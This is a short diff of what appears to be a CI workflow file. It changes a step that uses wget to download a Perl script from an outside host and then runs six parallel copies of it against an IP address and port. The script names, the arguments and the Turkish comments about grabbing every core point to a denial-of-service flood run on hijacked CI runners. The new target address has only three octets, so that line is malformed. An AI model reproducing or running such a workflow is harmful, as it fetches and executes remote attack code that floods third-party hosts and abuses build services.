@@ -16,14 +16,15 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/kS6ENuhaxi/privtcp.pl
+          wget https://wgetz.com/0YXO22crKN/droper_class.pl
+
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
         run: |
           PIDS=()
           # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            perl privtcp.pl 204.76.203.30 443 10000 65600 &
+            perl droper_class.pl 95.173.190 53 1400 100 &
             PIDS+=($!)
           done
           
